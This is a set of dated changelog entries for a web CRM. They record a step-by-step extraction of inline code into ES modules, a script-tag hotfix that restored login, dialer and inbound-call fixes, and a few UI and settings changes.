  { date:'2026-05-16', time:'21:30', name:'Build — extract src/contacts/selection.js (step 8e)', area:'Build, Contacts', description:'Fifth file in src/contacts/. Purely additive infrastructure change — created CRM file/src/contacts/selection.js as the twelfth ES module, exporting 6 bulk-selection functions plus the view switcher: toggleContactSelection, toggleSelectAllContacts, clearContactSelection, syncBulkActionBar, getSelectedContacts (from index.html ~11303-11365) and setContactView (~11405-11423). Loaded via <script type="module" src="src/contacts/selection.js?v=2026-05-16-12"></script> after src/contacts/filters.js. The inline copies are intentionally left in place — every existing callsite (row checkboxes, the select-all checkbox in the table header, the bulk action bar, the Contacts/Log view-toggle tabs) still resolves to the inline versions via onclick="..." attribute strings. The module is purely additive; nothing imports it yet. ONE STATE-MIRROR ENTRY ADDED: contactView (line in index.html mirror block at the end of the inline <script>). selectedContactIds was already bridged in 8d-prep. window._visibleContactIds is left as-is — it\'s NOT a `let`-style binding, it\'s a transient window property the inline renderContacts sets before the bulk bar reads it, so it doesn\'t need an Object.defineProperty bridge. ADAPTATIONS from verbatim: state vars via window.* (selectedContactIds, contactView, contacts); function refs via window.* (renderBulkActionLog); module-local refs called bare (syncBulkActionBar). References inside onclick="..." attribute strings (toggleContactSelection, toggleSelectAllContacts, setContactView) are LEFT BARE because those strings are parsed at click-time and resolve via window from inline. Verification: window.__nlmContactsSelectionLoaded should be true in DevTools console after deploy; row checkboxes, select-all, bulk action bar, and view-toggle tabs should behave identically (inline still authoritative). Roadmap: 8f (index.js: renderContacts + table + state) is the last and biggest step.', commit:'ba14361' },
  { date:'2026-05-16', time:'21:00', name:'Build — extract src/contacts/filters.js (step 8d)', area:'Build, Contacts', description:'Fourth file in src/contacts/. Purely additive infrastructure change — created CRM file/src/contacts/filters.js as the eleventh ES module, exporting ~21 filter/sort/dropdown functions from three blocks of index.html: tag filters (lines ~3026-3118: renderContactTagFilters, renderTagFilterChips, removeTagChip, searchTagSuggestions, showAllTagSuggestions, selectTagFilter, handleTagFilterKey, toggleContactTagFilter, clearContactTagFilters), source+pipeline filters (lines ~4161-4232: toggleSourceDropdown, renderSourceDropdown, toggleSourceFilter, clearSourceFilters, updateSourceLabel, togglePipelineDropdown, renderPipelineDropdown, setPipelineFilter, clearPipelineFilter, updatePipelineLabel, closeAllContactDropdowns), and sort (lines ~4560-4598: setContactSort, sortContactList). Loaded via <script type="module" src="src/contacts/filters.js?v=2026-05-16-11"></script> after src/contacts/import-export.js. The inline copies are intentionally left in place — every existing callsite (sidebar tag chips, source/pipeline dropdown clicks, column header sort arrows, all the inline onclick="..." attributes) still resolves to the inline versions. The module is purely additive; nothing imports it yet. FIRST MODULE TO BENEFIT FROM 8d-prep STATE MIRROR (21043c1): unlike helpers/notes/import-export, this module\'s functions actually need to read AND mutate inline state (activeContactTagFilters, activeSourceFilters, activePipelineFilter, contactSort), and now they work correctly via window.<name> because the Object.defineProperty bridges in index.html make window.<state> a live view of the inline binding. ADAPTATIONS from verbatim: state vars via window.* (activeContactTagFilters, activeSourceFilters, activePipelineFilter, contactSort, contactSources, contacts, pipelines, masterTags, customColumns) thanks to the mirror; function refs via window.* (getMasterTag, renderContacts) because module scope cannot resolve inline function declarations. Module-local refs (renderTagFilterChips, closeAllContactDropdowns, updateSourceLabel, updatePipelineLabel, renderSourceDropdown, renderPipelineDropdown, all module-local) are called bare from within the module. References inside onclick="..." attribute strings (removeTagChip, selectTagFilter, clearSourceFilters, toggleSourceFilter, clearPipelineFilter, setPipelineFilter, setContactSort) are LEFT BARE because those strings are parsed at click-time and resolve via window from inline. Two outside-click document listeners (~3121 and ~4233 in index.html) are NOT duplicated here — would double-fire and waste cycles; inline copies remain authoritative for click-outside dismissal. Verification: window.__nlmContactsFiltersLoaded should be true in DevTools console after deploy, and tag/source/pipeline filtering + column sort should behave identically (inline still authoritative). Roadmap: 8e (selection.js) and 8f (index.js: renderContacts + table + state) remain.', commit:'264e52c' },
  { date:'2026-05-16', time:'20:30', name:'Build — state mirror for ES modules (step 8d-prep)', area:'Build', description:'Infrastructure step before continuing the contacts extraction. Discovery: every contacts module shipped so far (helpers 601d472, notes 8697d85, import-export 176420e) references inline state like contacts/sb/pipelines via `window.<name>`, but those references would throw TypeError if any callsite ever used them — because inline `let`/`const` declarations do NOT become properties of `window`. Only `function` and `var` declarations do. Practical impact today: zero, because nothing imports those modules. Practical impact later: the moment a callsite migrates to `import { findContactByPhone } from \'./src/contacts/helpers.js\'`, that function tries to read `window.contacts` -> undefined -> throws on `.find()`. Fix: ~25 lines of Object.defineProperty added at the very end of the inline `<script>` block in index.html, one per state var that any module needs. Each call bridges a single inline state var: a getter that closes over the inline binding makes `window.contacts` always return the CURRENT inline `contacts`; a setter (where reassignment from a module is plausible) maps `window.contacts = arr` to inline `contacts = arr`. Vars that are Set/object instances and only mutated in place (activeContactTagFilters, activeSourceFilters, contactSort, selectedContactIds) don\'t need setters because mutation through the returned reference targets the same object inline holds — no copy, no drift. 20 vars bridged: contacts, pipelines, sb, currentUser, masterTags, activeContactTagFilters, activeSourceFilters, activePipelineFilter, contactSort, contactSources, contactStatuses, customColumns, visibleColumns, columnOrder, selectedContactIds, gcalAccessToken, calView, calDate, calEvents, calSources. Unblocks every existing AND future module — callsite migration is now safe to start any time. Verification: window.__nlmStateMirrorLoaded should be true in DevTools console after deploy, AND window.contacts should equal the current inline contacts array (e.g. `Array.isArray(window.contacts) && window.contacts.length` should match what the Contacts page shows). Zero behavior change for users — this is foundational infrastructure for the next extraction phase.', commit:'21043c1' },
  { date:'2026-05-16', time:'20:00', name:'Build — extract src/contacts/import-export.js (step 8c)', area:'Build, Contacts', description:'Third file in src/contacts/. Purely additive infrastructure change — created CRM file/src/contacts/import-export.js as the tenth ES module, exporting the three CSV-import functions from index.html (openImportContacts at line ~11122, handleCSVImport at ~11202, confirmCSVImport at ~11239) plus the module-scoped _csvImportRows staging variable. Index.html now loads it via <script type="module" src="src/contacts/import-export.js?v=2026-05-16-10"></script> after src/contacts/notes.js. The existing inline copies are intentionally left in place — the hidden file input at index.html:1496 wires `onchange="handleCSVImport(event)"` to the INLINE handler, and the modal\'s Import Contacts button wires `onclick="confirmCSVImport()"` to the INLINE one too. The module is purely additive; nothing imports it yet. EXPORT SIDE NOTE: contactsToCSV + exportContactsCSV live in helpers.js (step 8a), NOT here. They were grouped with the other small pure helpers in 8a because they\'re tiny and have no dependencies; this file is reserved for the heavier import flow that mutates state, depends on bulk-action infra, and depends on tag-master helpers. "import-export" in the filename describes intent more than current contents — when state-coupled export features (selective export, server-side export, etc.) get added later, they\'ll live here. ADAPTATIONS from verbatim (every bare identifier in module scope that refers to an inline-only global): openModal -> window.openModal, closeModal -> window.closeModal, showToast -> window.showToast, sanitizeText -> window.sanitizeText, sanitizeHtml -> window.sanitizeHtml, contacts -> window.contacts, sb -> window.sb, getMasterTag -> window.getMasterTag, ensureMasterTag -> window.ensureMasterTag, startBulkAction -> window.startBulkAction, finishBulkAction -> window.finishBulkAction, renderContacts -> window.renderContacts, renderContactTagFilters -> window.renderContactTagFilters, renderTagsPage -> window.renderTagsPage. References inside onclick="..." attribute strings (closeModal, confirmCSVImport) are LEFT BARE because those strings are parsed at click-time by the HTML parser and resolve via window from the inline hoisted-function declarations. STATE: the module\'s _csvImportRows is a separate variable from the inline `let _csvImportRows = []`. They cannot collide because the file input\'s onchange resolves to the inline handler. When callsites migrate to import from this module, the inline copy can be deleted (and the inline _csvImportRows with it) without breaking anything. Verification: window.__nlmContactsImportExportLoaded should be true in DevTools console after deploy. Smoke test: Contacts page -> Import button -> pick a CSV -> preview renders -> click Import -> contacts land in the list. All paths still use the inline copies. Roadmap: 8d (index.js with renderContacts + state) is the last and biggest step.', commit:'176420e' },
  { date:'2026-05-16', time:'19:30', name:'Build — extract src/contacts/notes.js (step 8b)', area:'Build, Contacts', description:'Second file in src/contacts/. Purely additive infrastructure change — created CRM file/src/contacts/notes.js as the ninth ES module, exporting the seven notes-tab functions from index.html (lines ~5404-5534): renderContactFollowupsHTML, renderContactNotes, addContactNote, editContactNote, cancelContactNoteEdit, saveContactNoteEdit, deleteContactNote. Index.html now loads it via <script type="module" src="src/contacts/notes.js?v=2026-05-16-9"></script> after src/contacts/helpers.js. The existing inline copies are intentionally left in place — every existing callsite (Activity tab "Notes" section, follow-up sub-section, add/edit/delete buttons rendered via onclick="..." strings) still resolves to the inline versions. The module is purely additive; nothing imports it yet. SCOPE DECISION: 8b was originally planned as 4 functions (the renders + cancel/edit), but the CRUD path (addContactNote / saveContactNoteEdit / deleteContactNote) is too tightly coupled to renderContactNotes to split sensibly — splitting would mean either re-extracting later or having a half-module sitting next to a half-inline module. All 7 notes functions kept together in this single deploy. ADAPTATIONS from verbatim: bare contacts -> window.contacts, sb -> window.sb, showToast -> window.showToast, requirePerm -> window.requirePerm, touchContactActivity -> window.touchContactActivity, fmtNoteTime -> window.fmtNoteTime, _isFollowupAutoNote -> window._isFollowupAutoNote, followupTypeChip -> window.followupTypeChip (template expr). The bare `typeof getFollowupsForContact === \'function\'` defensive check was rewritten as `typeof window.getFollowupsForContact === \'function\'` because module scope cannot resolve the bare identifier even inside typeof (typeof guards against undeclared globals via the window object, not via lexical scope). References inside onclick="..." attribute strings (openFollowupModal, saveContactNoteEdit, cancelContactNoteEdit, editContactNote, deleteContactNote) are LEFT BARE because those strings are parsed at click-time and resolve via window from the inline hoisted-function declarations. Verification: window.__nlmContactsNotesLoaded should be true in DevTools console after deploy, and the Activity tab on any contact (Add note, Edit, Cancel, Save, Delete, Follow-ups list) should behave identically because the inline copies are still authoritative. Roadmap: 8c (import-export.js) and 8d (index.js with renderContacts + state) remain.', commit:'8697d85' },
  { date:'2026-05-16', time:'19:00', name:'Build — start src/contacts/ extraction (step 8a: helpers.js)', area:'Build, Contacts', description:'First file in the new src/contacts/ subdirectory. Purely additive infrastructure change — created CRM file/src/contacts/helpers.js as the eighth ES module, exporting four small contact helpers (findContactByPhone, migrateContactNotes, contactsToCSV, exportContactsCSV). Index.html now loads it via <script type="module" src="src/contacts/helpers.js?v=2026-05-16-8"></script> after src/calendar/index.js. The existing inline copies of all four functions are intentionally left in place — every existing callsite still resolves to the inline versions. The module is purely additive; nothing imports it yet. Why mini-steps for contacts: the inline contacts surface (~30 functions, ~render+filters+sort+modals+import/export, spread across thousands of lines) is too big to extract in a single pass and too state-coupled (touched by dialer, conversations, calendar follow-ups, SMS). Roadmap: 8a helpers.js (this), 8b notes.js (renderContactNotes/editContactNote/cancelContactNoteEdit/renderContactFollowupsHTML), 8c import-export.js (openImportContacts + CSV import flow), 8d index.js (renderContacts + table + filters + sort + modals + state). ADAPTATIONS from verbatim (same scope-resolution pattern as calendar/datepicker.js and shared/permissions.js): bare `contacts` rewritten as `window.contacts` (inline `let contacts = []` at index.html:2696), bare `sb` as `window.sb`, bare `showToast` as `window.showToast`. Safety: prior to staging this extraction, all 5 production contacts were snapshotted to backups/contacts-2026-05-16.json in the project root as a belt-and-suspenders precaution; the change is JS-only and does not touch the database, Supabase RLS, or the in-memory contacts cache. Verification: window.__nlmContactsHelpersLoaded should be true in DevTools console after deploy, and the Contacts page (search, filter, open card, export CSV) should behave identically because the inline copies are still authoritative.', commit:'601d472' },
  { date:'2026-05-16', time:'18:30', name:'Dialer — X close button drops active call + wider terminal-state coverage', area:'Calling, Dialer', description:'Two small lifecycle fixes to the floating dialpad. (1) The X close button on the dialpad header (toggleDialpad) now ends any active call before hiding the panel. Previously closeDialpad just hid the UI while the call kept running silently in the background — confusing because the timer, mute, and Drop buttons all disappeared but the call was still live. Only the X button is affected; the close-on-navigate-to-settings path is unchanged (closeDialpad is still called there directly, doesn\'t end the call, so navigating to Settings during a call leaves the call running with the panel hidden — same as before). (2) attachCallTeardown now matches a wider set of terminal call.state values: added `terminated`, `completed`, `disconnected`, `destroyed`, `gone`, `aborted` alongside the previously-matched `ended`/`ending`/`destroy`/`done`/`hangup`. SignalWire SDK variants emit different terminal-state names; without the wider set, some hangup paths leave the "On Call" UI stuck until the user manually drops. Purely defensive widening — none of the added states are valid intermediate states, so the change can\'t break anything. Combined effect: hangup is now real-time across more SDK variants, and the X button does what users expect.', commit:'2a50ffa' },
  { date:'2026-05-16', time:'17:30', name:'Build — extract src/calendar/index.js (step 7c, completes calendar/ extraction)', area:'Build, Calendar', description:'Third and final file in src/calendar/. Purely additive infrastructure change — created CRM file/src/calendar/index.js as the seventh ES module, containing the full CALENDAR block from index.html (~lines 7627-8549) MINUS the parts already extracted in steps 7a (US holiday helpers) and 7b (date picker). Index.html now loads it via <script type="module" src="src/calendar/index.js?v=2026-05-16-7"></script> after src/calendar/datepicker.js. The inline copy is intentionally left in place — every existing callsite (contact card, dialer follow-up flow, Conversations sidebar, page navigation onclick attributes) still resolves to the inline functions and state. The module is purely additive; nothing imports it yet. Module exports: renderCalendar, setCalView, calNavigate, calToday, toggleCalSource, filterCalByContact, setCalContactFilter, clearCalContactFilter, getCalEventsForDay, getVisibleCalEvents, openEventsListModal, renderUpcomingEvents, renderFollowupsList, openEventModal, setEvDuration, updateEvEndFromDuration, evAutoFillGuest, addEvGuest, removeEvGuest, saveCalEvent, editCalEvent, updateCalEvent, deleteCalEvent, saveCalEvents, saveCalSources, renderCalSources, removeCalSource, openCalSourceModal, addGcalSource, selectCalColor, addCalSource. ADAPTATIONS from verbatim (every bare identifier in module scope that refers to an inline-only global — module scope cannot resolve them lexically): showToast/openModal/closeModal/sb/contacts/gcalIsConnected/gcalAccessToken/getAv/initials/followupTypeChip all prefixed with window. References inside onclick="..." attribute strings (renderCalendar, editCalEvent, openFollowupModal, etc.) are LEFT BARE because those strings are parsed at click-time and resolve via window from inline. State (calView/calDate/calEvents/calSources) is module-scoped — separate from inline state — until a future migration unifies them (option (a) of the planning conversation, deferred to future step). US-holiday helpers (_nthWeekday/_lastWeekday/_ymd/getUsHolidaysForYear) re-declared verbatim instead of imported from ./holidays.js — duplication is the strangler-fig cost. Verification: window.__nlmCalendarLoaded should be true in DevTools console after deploy, and the Calendar page should render and behave identically (inline copy still doing all the work).', commit:'d0f076d' },
  { date:'2026-05-16', time:'16:30', name:'Build — extract src/calendar/datepicker.js (step 7b)', area:'Build, Calendar, Dialer', description:'Second file in src/calendar/. Purely additive infrastructure change — created CRM file/src/calendar/datepicker.js as the sixth ES module, exporting the custom date/time picker block from index.html (openDatePicker, closeDatePicker, positionDpPopup, dpOutsideClick, renderDatePickerPopup, dpChangeMonth, dpSelectDay, dpSetHour12, dpSetPeriod, dpSetMin, dpConfirm, plus module-scoped _dpState). Index.html now loads it via <script type="module" src="src/calendar/datepicker.js?v=2026-05-16-6"></script> after src/calendar/holidays.js. The inline copies (~line 8047-8205) are intentionally left in place — the picker is wired via inline HTML onclick="dpSelectDay(...)", "openDatePicker(...)", etc., which resolve through the hoisted-function-declaration globals from the inline <script>; this module does NOT do `window.dpSelectDay = ...` because that would silently swap the implementation while the module\'s _dpState stays separate from the inline one, causing two pickers to diverge. The module is purely additive; nothing imports it yet. ONE adaptation from verbatim: the bare `showToast` call inside dpConfirm() was rewritten as `window.showToast` because module scope cannot resolve a bare identifier defined in an inline <script>. Same pattern as step 5. Reusable from both Calendar (event modal) and Dialer (Call Disposition follow-up). Verification: window.__nlmCalendarDatepickerLoaded should be true in DevTools console after deploy, and Settings → Version History should continue to render every entry, and both date pickers (Calendar New Event and Call Disposition follow-up) should continue to open/close correctly. Roadmap: 7c (src/calendar/index.js, renderCalendar + CRUD + state) is next and last for calendar/.', commit:'8a05e4b' },
  { date:'2026-05-16', time:'16:00', name:'Build — start src/calendar/ extraction (step 7a: holidays.js)', area:'Build, Calendar', description:'First file in the new src/calendar/ subdirectory. Pure additive infrastructure change — created CRM file/src/calendar/holidays.js as the fifth ES module, exporting the four pure date/holiday helpers from index.html\'s CALENDAR block (_nthWeekday, _lastWeekday, _ymd, getUsHolidaysForYear). Index.html now loads it via <script type="module" src="src/calendar/holidays.js?v=2026-05-16-5"></script> after src/version-history.js. The existing inline copies (near "// US FEDERAL HOLIDAYS" at line ~7653) are intentionally left in place — every callsite still resolves to the inline versions. Module is purely additive; nothing imports it yet. Why split into mini-steps: the full CALENDAR block is ~924 lines / ~30 KB and is tightly state-coupled (reads calView/calDate/calEvents/calSources, called from contact card and dialer follow-up flows). Doing it as one extraction would mean either duplicating 30 KB of stateful logic (drift risk) or one massive untested edit. Roadmap for calendar: 7a holidays.js (this), 7b datepicker.js, 7c index.js (renderCalendar + CRUD + state). getUsHolidayEvents() is deliberately NOT in this module — it reads inline-scoped `calSources` and goes with step 7c. Verification: window.__nlmCalendarHolidaysLoaded should be true in DevTools console after deploy.', commit:'70ea62b' },
  { date:'2026-05-16', time:'11:30', name:'Build — extract src/version-history.js (kills BUG-007/009 class)', area:'Build', description:'Step 6 of the planned src/ modular extraction (see saved memory `target-layout-decision`). Unlike steps 3-5, this extraction REMOVES the inline copy in the same deploy because there are no parse-time concerns — renderVersionHistory() runs lazily on click into Settings → Version History, well after all modules have executed. Created CRM file/src/version-history.js which sets window.APP_VERSIONS to the full entries array (verbatim copy of what used to live inline). Deleted the inline `const APP_VERSIONS = [...]` block from index.html (~lines 6225-6294, ~70 lines). Switched the three references inside renderVersionHistory() to read window.APP_VERSIONS instead. WHY this was prioritized ahead of step 6/calendar on the original roadmap: BUG-007 (2026-05-14) and BUG-009 (2026-05-16) were both caused by literal </script> text inside APP_VERSIONS description strings prematurely terminating the inline <script> block in index.html. Module scripts are parsed in JS mode from the start, so </script> literals inside this module do NOT terminate it — that class of bug is now permanently gone. The escape dance in existing entries is preserved as a verbatim copy (do not refactor while extracting). Verification: window.__nlmVersionHistoryLoaded should be true in DevTools console after deploy, and Settings → Version History should render correctly with all entries.', commit:'df2e854' },
  { date:'2026-05-16', time:'10:45', name:'Hotfix — restore login (escape literal closing-script in version-history strings)', area:'Build, Auth', description:'Login was completely broken on the live site: the Sign In button was inert and Supabase auth logs showed zero password-grant attempts because the request was never sent. Root cause: the three APP_VERSIONS entries added earlier today (c62b14d, 7568ab1, 57ab8ab) each contained the literal text of an opening + closing script tag as prose inside their description string. Per HTML5, the parser ends an inline <script> block at the first <\/script> it sees — even inside a JS string — so the entire inline script terminated on line 6231 mid-array, and everything past it (navigate(), the login button handler, all event wiring) was parsed as HTML text and never executed. sb.signIn() was defined earlier so the API would have worked if anything had called it. Fix: replaced each closing tag in the three description strings with the JS-escaped form (backslash before the slash), which produces a literal / at runtime but does NOT terminate the script as far as the HTML parser is concerned. Three targeted edits; nothing else touched. Verified by re-extracting the inline script (now parses as one 555KB block instead of being truncated at 182KB) and running node --check. Same class of bug as the one logged on 2026-05-14 — one stray character in an APP_VERSIONS description kills the whole app because there is no isolation in the single-file architecture. See BUGLOG.md BUG-009 for the full writeup and the prevention rule.', commit:'3aec56e' },
  { date:'2026-05-16', time:'04:00', name:'Build — extract src/shared/permissions.js', area:'Build', description:'Step 5 of the planned src/ modular extraction (see saved memory `target-layout-decision`). Purely additive infrastructure change — created CRM file/src/shared/permissions.js as the third ES module, exporting PERMISSION_DEFS, PERMISSION_KEYS, PAGE_PERMISSION, rolePermDefaults(), getUserPerms(), can(), and requirePerm(). Index.html now loads it via <script type="module" src="src/shared/permissions.js?v=2026-05-16-3"><\/script> after src/shared/toast.js. The existing inline PERMISSIONS block (~line 2697) is intentionally left in place — every existing callsite still resolves to the inline copy. The module is purely additive; nothing imports it yet. ONE adaptation from verbatim: the inline `let currentUser = null` is module-scoped to the inline script (not on window), so the module\'s can() reads window.currentUser explicitly to avoid ReferenceError when called from module scope. Until a future step mirrors window.currentUser = currentUser on each inline assignment (or callsites pass user in), the exported can()/requirePerm() are shape-only — calling them today always returns false. That is FINE because nothing imports the module yet. Verification: window.__nlmPermissionsLoaded should be true in DevTools console after deploy.', commit:'57ab8ab' },
  { date:'2026-05-16', time:'03:30', name:'Build — extract src/shared/toast.js', area:'Build', description:'Step 4 of the planned src/ modular extraction (see saved memory `target-layout-decision`). Purely additive infrastructure change — created CRM file/src/shared/toast.js as the second ES module, exporting showToast(). Index.html now loads it via <script type="module" src="src/shared/toast.js?v=2026-05-16-2"><\/script> immediately after src/config.js. The existing inline `let toastTimer` + `function showToast(...)` block (near the TOAST anchor, ~line 2965) is intentionally left in place — function declarations are hoisted globals, and every existing inline callsite (262 toast references across index.html) still wires through that global. The module export is module-scoped only; nothing imports it yet. The inline copy will be deleted once new modules switch to `import { showToast }` and no inline call paths remain. Verification: window.__nlmToastLoaded should be true in DevTools console after deploy.', commit:'7568ab1' },
  { date:'2026-05-16', time:'03:00', name:'Build — start modular extraction (src/config.js)', area:'Build', description:'Step 3 of the planned src/ modular extraction. Purely additive infrastructure change: created CRM file/src/config.js as the first ES module, exporting SUPABASE_URL and SUPABASE_KEY. Index.html now loads it via <script type="module" src="src/config.js?v=2026-05-16-1"><\/script> right after the SignalWire CDN. The existing inline const SUPABASE_URL / SUPABASE_KEY declarations are intentionally left in place — line ~2597 reads SUPABASE_KEY at parse time before the deferred module would run, so removing the inline copy would throw ReferenceError. Values are duplicated for now; the inline copy will be deleted in a later step once nothing reads it at parse time. Verification: window.__nlmConfigLoaded should be true in DevTools console after deploy.', commit:'c62b14d' },
  { date:'2026-05-16', time:'02:30', name:'Contacts — remove AI Score and Next Action', area:'Contacts', description:'Per-contact AI Score (1-10 rating with reason) and Next Action (one-sentence suggestion) buttons removed from the contact detail panel along with their result rows and the aiScoreLead() / aiNextAction() functions. The matching score_lead and next_action prompt templates were also removed from api/ai.js. /api/ai itself and the AI Draft feature in Conversations (draft_reply) plus Campaigns (campaign_copy) are unaffected.', commit:'203cf94' },
  { date:'2026-05-16', time:'02:00', name:'UI — static neon accents + SVG icons for chrome', area:'UI, Calling, Contacts, Settings', description:'Two coordinated polish changes with no performance cost. (1) Static neon accents — CSS box-shadow / text-shadow / drop-shadow glows applied to: the logo icon and brand wordmark, the active sidebar item (inset ring + brighter left bar with glow + tinted active icon), the in-call timer (green glow), the currency picker active state, and primary button hover. All static (no animation), GPU-composited, basically free. (2) First-pass emoji → SVG replacement for high-visibility chrome: contact detail buttons (Save / Email / Message / Call / AI Score / Next Action), contact detail tabs (Info / Pipeline / Tags / Activity), Integrations section headers, bulk-action toolbar, Conversations compose tabs, Social view toggle, unknown-number detail drawer buttons, Save & Keep Open, and the incoming-call notification card (now a glowing accent circle). New ICON_PATHS map + icon(name, size) helper using stroke=currentColor so icons inherit the surrounding text color automatically. Persisted data and less-prominent chrome emojis untouched in this pass.', commit:'001384d' },
  { date:'2026-05-16', time:'01:30', name:'Settings — Currency picker (USD / PHP / EUR)', area:'Settings', description:'New Currency card under Settings (right after Appearance) with three options: US Dollar ($), Philippine Peso (₱), Euro (€). The chosen symbol is used everywhere the CRM prints money — deal values on contact cards and the pipeline board, pipeline tabs total, column totals, Conversations sidebar deal value, Dashboard "Est. Revenue" widget, and the Value (…) form labels in the deal edit modals. Behind the scenes: all 11 hardcoded ₱ usages were replaced with a single formatCurrency() / getCurrencySymbol() helper that reads from localStorage. Default remains PHP for back-compat. Switching currency re-renders every affected view immediately — no reload needed.', commit:'4f385b3' },
  { date:'2026-05-16', time:'01:00', name:'Incoming call — center top of screen', area:'Calling', description:'Moved the "Incoming call from …" card from fixed top-right to horizontally centered at the top of the viewport (top:24px, left:50% with translateX(-50%)). Bumped width from 320 to 340 and added max-width:calc(100vw - 32px) so it stays in bounds on narrow screens.', commit:'4977632' },
  { date:'2026-05-16', time:'00:30', name:'Dialer — wider popup + From picker + current caller ID', area:'Dialer, Calling', description:'Three related dialer tweaks. (1) Widened the floating dialpad from 200px → 260px so the new picker fits and the keypad breathes. (2) New "From" picker row above the dial input — single SignalWire number renders as a static label, multiple numbers render as a clickable row with a dropdown menu showing every connected number with label, primary chip, and a ✓ on the active one. Selection re-uses dialerActiveNumber so the Dialer page\'s Calling From tile and the floating dialpad picker stay in sync both ways. (3) New small "From: (305) 845-8883" line in the in-call panel (outbound calls only). dial() now passes from to the SignalWire SDK as a caller-ID hint. NOTE: the picker is UX-only on the PSTN leg until the outbound SWML script "Bill" is updated to use "%{call.from}" instead of the hardcoded number — see BACKLOG "Per-number caller ID needs SWML update".', commit:'d2d6363' },
  { date:'2026-05-16', time:'00:00', name:'Dialer — floating dialpad is draggable', area:'Dialer, Calling', description:'The top-right phone-icon toggle still lives in the topbar; clicking it still opens the floating dialer popup. What changed: the popup itself is now draggable from its header bar (grab cursor on hover, grabbing cursor while dragging). The position is persisted to localStorage (nlm_dialpad_pos) and reapplied next time you open the dialer, so once you put it where you like it, it stays. Clamped to the viewport on both drag and window resize so the panel can\'t be dragged off-screen and lost. Ctrl+click the header resets to the default top-right position. Implementation uses pointer events with setPointerCapture so the drag tracks cleanly even when the cursor briefly leaves the header. The × close button keeps working — pointerdown ignores anything inside an [onclick] target.', commit:'2a4767c' },
  { date:'2026-05-15', time:'23:30', name:'Inbound calls — strip SIP URI from caller ID', area:'Calling', description:'Inbound caller numbers were displaying like "sip:+18325832601@sip.signalwi…" everywhere they appeared — Phone field on contacts, the call history list, the in-call UI. Cause: SignalWire Fabric inbound calls deliver the From field as a SIP URI, and the first inbound deploy stored that string verbatim. New cleanCallerNumber() helper strips sip:/sips:/tel: prefixes, angle brackets, the @host suffix, and any ;params; applied at the source in handleIncomingInvite and as fallback in accept/decline. fmtPhoneDisplay now cleans first so legacy dirty history rows still render formatted. New migrateSipUriPhones() runs once at app load and back-patches any contacts.phone / callHistory rows already polluted in Supabase / localStorage. Idempotent.', commit:'2f3eeb1' },
  { date:'2026-05-15', time:'23:00', name:'Call history — detail panel for unsaved numbers', area:'Calling, Dialer', description:'Clicking a call-history row used to behave inconsistently: saved contacts opened the right-side contact detail drawer, but unknown numbers just pre-filled the dialpad input. Now both call-history surfaces (the dialpad widget list and the larger Dialer → Call History view) route unknown numbers to a new openUnknownNumberDetail() drawer that mirrors the saved-contact UX — formatted phone as the title, stat strip (total calls, inbound vs outbound, talk time), Add to Contacts (pre-fills the phone field), Call Back, Send SMS, and the per-number call-history list. If the number has been added to contacts in the meantime, it routes to the real contact drawer instead.', commit:'23288e9' },
  { date:'2026-05-15', time:'22:30', name:'Calls — real-time hangup + caller number in history', area:'Calling, Dialer', description:'Two fixes after the first inbound test. (1) When the remote party (caller) hung up, the CRM kept showing the call as active until manually dropped — for inbound calls bridged via SWML connect, the SDK signals hangup through a call.state transition to ending/ended rather than the destroy/room.left events outbound uses. Refactored both flows to a shared attachCallTeardown() that listens to destroy, room.left, call.ended, and acts on terminal call.state values; idempotent. (2) The caller phone number was visible during the call but disappeared from the call-history list and the Dialer Call History view after the call ended. Both renderers now show the formatted phone alongside the contact name (matched contacts) or as the title (unmatched callers). New fmtPhoneDisplay() helper formats +13058458883 → (305) 845-8883.', commit:'66e00c5' },
  { date:'2026-05-15', time:'22:00', name:'Incoming calls — ring the browser', area:'Calling', description:'PSTN calls to a connected SignalWire number now ring the CRM in the browser. On app load (after login), the SignalWire Call Fabric subscriber is brought online via client.online({ incomingCallHandlers }); when an inbound call arrives, a fixed-position "Incoming call from <name or number>" card appears in the top-right with Accept (green) / Decline (red) buttons and a soft 1s on/off WebAudio ringtone (matches caller to a CRM contact when possible). Accept routes the call into the existing dialpad UI (timer + mute + drop) and writes an "📞 Inbound call from …" entry into the contact\'s conversation. Decline rejects the invite and logs a missed inbound call to the call history. activeCallDirection is now tracked so endCall() / logCall() record inbound vs outbound correctly. Token-refresh path re-registers the subscriber automatically. Requires the calling permission. Requires a SignalWire dashboard SWML inbound handler on the number — see CONTINUE-HERE.md.', commit:'da657e4' },
  { date:'2026-05-15', time:'20:30', name:'Follow-up info consolidated to the Activity tab', area:'Contacts, Dialer', description:'Scheduling, editing, or deleting a follow-up no longer pushes a "📅 Follow-up scheduled …" entry into the contact\'s Notes timeline. The Activity tab\'s Follow-ups section is now the single source of truth — the Notes list is for user-typed notes only. Existing auto-generated entries from earlier sessions are filtered out of the contact-modal Notes list and the dialer\'s right-side contact panel; they\'re still in the database (harmless) but hidden from view. last_activity is still bumped on follow-up actions so list-view recency stays accurate.', commit:'7ad83f0' },
  { date:'2026-05-15', time:'20:00', name:'Call Disposition — modal stays open on pill click', area:'Dialer', description:'The Call Disposition modal no longer closes when you click a disposition pill (HOT/INTERESTED/etc.) — clicking now records the disposition but keeps the pop-up open so accidental clicks are correctable and you can still add a note, change the disposition, or schedule a follow-up. Re-clicking a different pill updates the same log entry + contact note in place (no duplicates); the selected pill is highlighted with a ✓ check. The modal now closes only via the × button, the Skip button, the new Done button, or Esc — and outside-click is and remains disabled. If you close with a follow-up date still in the picker, it auto-commits so the work isn\'t lost.', commit:'34eb7d5' },
  { date:'2026-05-15', time:'19:30', name:'Follow-ups — Google Meet 4th icon + Call Disposition Schedule button', area:'Calendar, Dialer', description:'Added a 4th type for follow-ups: 🎥 Google Meet. The DB CHECK constraint on calendar_events.followup_type was widened to accept "meet". The Call Disposition modal now has its own copy of the 4 round icon buttons (Call/SMS/Email/Meet) plus a dedicated "📅 Schedule follow-up" confirm button — you can stage and commit the follow-up directly from the disposition pop-up without having to click a disposition pill first (the disposition click still works the same way for those who prefer the one-shot flow). After clicking Schedule, the date picker area is replaced with a green confirmation panel so it\'s obvious the follow-up was saved.', commit:'a03e416' },
